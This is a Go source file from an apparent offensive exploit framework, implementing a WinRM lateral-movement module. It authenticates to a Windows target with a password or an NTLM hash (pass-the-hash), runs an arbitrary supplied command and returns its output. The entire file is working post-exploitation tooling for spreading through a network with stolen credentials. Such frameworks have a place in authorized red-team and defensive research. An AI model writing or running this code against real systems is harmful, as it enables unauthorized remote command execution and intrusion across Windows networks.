package lateral

import (
	"bytes"
	"context"
	"fmt"

	"github.com/masterzen/winrm"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Command == "" {
		return nil, fmt.Errorf("command required")
	}
	if cfg.Username == "" {
		return nil, fmt.Errorf("username required for WinRM")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return nil, fmt.Errorf("password or ntlm_hash required for WinRM")
	}

	// HTTP 5985, Insecure TLS skipped for HTTPS if ever enabled via future fields.
	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)
	user := formatDomainUser(cfg.Domain, cfg.Username)

	var client *winrm.Client
	var err error
	if cfg.NtlmHash != "" {
		hashHex, herr := normalizeNTHashHex(cfg.NtlmHash)
		if herr != nil {
			return nil, herr
		}
		params := *winrm.DefaultParameters
		params.TransportDecorator = func() winrm.Transporter {
			return newClientNTLMWithHash(user, hashHex)
		}
		// Password is unused by the hash transport; BasicAuth still carries the username.
		client, err = winrm.NewClientWithParameters(endpoint, user, "x", &params)
	} else {
		// Domain passwords need NTLM negotiate, not HTTP Basic.
		params := *winrm.DefaultParameters
		params.TransportDecorator = func() winrm.Transporter {
			return &winrm.ClientNTLM{}
		}
		client, err = winrm.NewClientWithParameters(endpoint, user, cfg.Password, &params)
	}
	if err != nil {
		return nil, fmt.Errorf("create WinRM client: %w", err)
	}

	var stdout, stderr bytes.Buffer
	exitCode, err := client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
	if err != nil {
		return nil, fmt.Errorf("WinRM exec: %w", err)
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR:\n" + stderr.String()
	}

	return &pb.LateralMoveResult{
		Method:  "winrm",
		Target:  cfg.Target,
		Success: exitCode == 0,
		Output:  output,
	}, nil
}
